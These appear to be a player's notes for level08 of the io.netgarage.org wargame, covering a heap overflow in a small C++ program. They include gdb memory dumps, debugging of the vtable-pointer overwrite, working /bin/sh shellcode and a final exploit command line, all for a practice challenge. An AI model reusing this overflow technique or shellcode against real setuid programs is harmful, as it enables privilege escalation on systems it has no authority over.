@@ -1,0 +1,222 @@
+level8@io:/levels$ cat level08.cpp 
+// writen by bla for io.netgarage.org
+#include <iostream>
+#include <cstring>
+#include <unistd.h>
+
+class Number
+{
+        public:
+                Number(int x) : number(x) {}
+                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
+                virtual int operator+(Number &r) {return number + r.number;}
+        private:
+                char annotation[100];
+                int number;
+};
+
+
+int main(int argc, char **argv)
+{
+        if(argc < 2) _exit(1);
+
+        Number *x = new Number(5);
+        Number *y = new Number(6);
+        Number &five = *x, &six = *y;
+
+        five.setAnnotation(argv[1]);
+
+        return six + five;
+}
+
+padding = 108
+
+b * main+140 
+
+>gdb -x /usr/share/gdbinit --args ./level08 $(python -c "print 'A' * 108 + 'BBBB'")
+gdb$ x/64wx 0x0804EA00
+0x804ea00:	0x00000000	0x00000000	0x00000000	0x00000071
+0x804ea10:	0x080488c8	0x41414141	0x41414141	0x41414141
+0x804ea20:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea30:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea40:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea50:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea60:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea70:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea80:	0x42424242	0x00000000	0x00000000	0x00000000
+0x804ea90:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eaa0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eab0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eac0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804ead0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eae0:	0x00000000	0x00000000	0x00000006	0x00020519
+0x804eaf0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+>gdb -x /usr/share/gdbinit --args ./level08 $(python -c "print 'A' * 108 + '\x14\xea\x04\x08'")
+
+0x804ea00:	0x00000000	0x00000000	0x00000000	0x00000071
+0x804ea10:	0x080488c8	0x41414141	0x41414141	0x41414141
+0x804ea20:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea30:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea40:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea50:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea60:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea70:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea80:	0x0804ea14	0x00000000	0x00000000	0x00000000
+0x804ea90:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eaa0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eab0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eac0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804ead0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eae0:	0x00000000	0x00000000	0x00000006	0x00020519
+0x804eaf0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+EAX: 0x804ea80 --> 0x804ea14 ('A' <repeats 108 times>, "\024\352\004\b")
+EBX: 0x804ea80 --> 0x804ea14 ('A' <repeats 108 times>, "\024\352\004\b")
+ECX: 0x70 ('p')
+EDX: 0x41414141 ('AAAA')
+ESI: 0xf7dca000 --> 0x1b1db0 
+EDI: 0xf7dca000 --> 0x1b1db0 
+EBP: 0xffffcee8 --> 0x0 
+ESP: 0xffffceb0 --> 0x804ea80 --> 0x804ea14 ('A' <repeats 108 times>, "\024\352\004\b")
+EIP: 0x8048737 (<main+163>:	call   edx)
+EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804872c <main+152>:	mov    DWORD PTR [esp+0x4],eax
+   0x8048730 <main+156>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x8048734 <main+160>:	mov    DWORD PTR [esp],eax
+=> 0x8048737 <main+163>:	call   edx
+   0x8048739 <main+165>:	add    esp,0x2c
+   0x804873c <main+168>:	pop    ebx
+   0x804873d <main+169>:	mov    esp,ebp
+   0x804873f <main+171>:	pop    ebp
+Guessed arguments:
+arg[0]: 0x804ea80 --> 0x804ea14 ('A' <repeats 108 times>, "\024\352\004\b")
+arg[1]: 0x804ea10 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+
+>scp level8@io.netgarage.org:/levels/level08 ./level08
+
+>gdb --args ./level08 $(python -c "print '\x18\xea\x04\x08' + '\x90' * 81 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x14\xea\x04\x08'")
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x804ea80 --> 0x804ea14 --> 0x804ea18 --> 0x90909090 
+EBX: 0x804ea80 --> 0x804ea14 --> 0x804ea18 --> 0x90909090 
+ECX: 0x70 ('p')
+EDX: 0x804ea18 --> 0x90909090 
+ESI: 0xf7dca000 --> 0x1b1db0 
+EDI: 0xf7dca000 --> 0x1b1db0 
+EBP: 0xffffcee8 --> 0x0 
+ESP: 0xffffceb0 --> 0x804ea80 --> 0x804ea14 --> 0x804ea18 --> 0x90909090 
+EIP: 0x8048737 (<main+163>:	call   edx)
+EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804872c <main+152>:	mov    DWORD PTR [esp+0x4],eax
+   0x8048730 <main+156>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x8048734 <main+160>:	mov    DWORD PTR [esp],eax
+=> 0x8048737 <main+163>:	call   edx
+   0x8048739 <main+165>:	add    esp,0x2c
+   0x804873c <main+168>:	pop    ebx
+   0x804873d <main+169>:	mov    esp,ebp
+   0x804873f <main+171>:	pop    ebp
+Guessed arguments:
+arg[0]: 0x804ea80 --> 0x804ea14 --> 0x804ea18 --> 0x90909090 
+arg[1]: 0x804ea10 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+[------------------------------------stack-------------------------------------]
+0000| 0xffffceb0 --> 0x804ea80 --> 0x804ea14 --> 0x804ea18 --> 0x90909090 
+0004| 0xffffceb4 --> 0x804ea10 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+0008| 0xffffceb8 --> 0xffffcee8 --> 0x0 
+0012| 0xffffcebc --> 0x8048829 (<__libc_csu_init+25>:	lea    edi,[ebx-0x104])
+0016| 0xffffcec0 --> 0x804ea10 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+0020| 0xffffcec4 --> 0x804ea80 --> 0x804ea14 --> 0x804ea18 --> 0x90909090 
+0024| 0xffffcec8 --> 0x804ea10 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+0028| 0xffffcecc --> 0x804ea80 --> 0x804ea14 --> 0x804ea18 --> 0x90909090 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048737 in main ()
+gdb-peda$ x/64wx 0x0804EA00
+0x804ea00:	0x00000000	0x00000000	0x00000000	0x00000071
+0x804ea10:	0x080488c8	0x0804ea18	0x90909090	0x90909090
+0x804ea20:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804ea30:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804ea40:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804ea50:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804ea60:	0x90909090	0x90909090	0x50c03190	0x732f2f68
+0x804ea70:	0x622f6868	0xe3896e69	0xe1895350	0x80cd0bb0
+0x804ea80:	0x0804ea14	0x00000000	0x00000000	0x00000000
+0x804ea90:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eaa0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eab0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eac0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+>./level08 $(python -c "print '\x18\xea\x04\x08' + '\x90' * 81 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x14\xea\x04\x08'")
+Segmentation fault (core dumped)
+
+>ulimit -c unlimited
+>sudo bash -c "echo 'core.%e.%p' > /proc/sys/kernel/core_pattern"
+>gdb ./level08 -c core.level08.71638
+gdb-peda$ i r
+eax            0xffffffe4	0xffffffe4
+ecx            0xffffcf08	0xffffcf08
+edx            0x804ea18	0x804ea18
+ebx            0xffffcf10	0xffffcf10
+esp            0xffffcf08	0xffffcf08
+ebp            0xffffcf58	0xffffcf58
+esi            0xf7dca000	0xf7dca000
+edi            0xf7dca000	0xf7dca000
+eip            0x804ea84	0x804ea84
+eflags         0x10296	[ PF AF SF IF RF ]
+cs             0x23	0x23
+ss             0x2b	0x2b
+ds             0x2b	0x2b
+es             0x2b	0x2b
+fs             0x0	0x0
+gs             0x63	0x63
+
+gdb-peda$ x/64wx 0x0804EA00
+0x804ea00:	0x00000000	0x00000000	0x00000000	0x00000071
+0x804ea10:	0x080488c8	0x0804ea18	0x90909090	0x90909090
+0x804ea20:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804ea30:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804ea40:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804ea50:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804ea60:	0x90909090	0x90909090	0x50c03190	0x732f2f68
+0x804ea70:	0x622f6868	0xe3896e69	0xe1895350	0x80cd0bb0
+0x804ea80:	0x0804ea14	0x00000000	0x00000000	0x00000000
+0x804ea90:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eaa0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eab0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+>strace ./level08 $(python -c "print '\x18\xea\x04\x08' + '\x90' * 81 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x14\xea\x04\x08'")
+
+execve("/bin//sh", ["/bin//sh"], [/* 27 vars */]) = -1 EFAULT (Bad address)
+
+needs to be 
+
+execve("/bin//sh", ["/bin//sh"], NULL)  = 0
+=>
+new sc:
+ 0:    31 c0                    xor    eax, eax
+ 2:    50                       push   eax
+ 3:    68 2f 2f 73 68           push   0x68732f2f
+ 8:    68 2f 62 69 6e           push   0x6e69622f
+ d:    89 e3                    mov    ebx, esp
+ f:    50                       push   eax
+10:    53                       push   ebx
+11:    89 e1                    mov    ecx, esp
+13:    b0 0b                    mov    al, 0xb
+15:    31 d2                    xor    edx, edx   <--- patch
+17:    cd 80                    int    0x80
+
+old original sc:
+xor    %eax,%eax
+push   %eax
+push   $0x68732f2f
+push   $0x6e69622f
+mov    %esp,%ebx
+push   %eax
+push   %ebx
+mov    %esp,%ecx
+mov    $0xb,%al
+int    $0x80
+
+./level08 $(python -c "print '\x18\xea\x04\x08' + '\x90' * 79 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80' + '\x14\xea\x04\x08'")
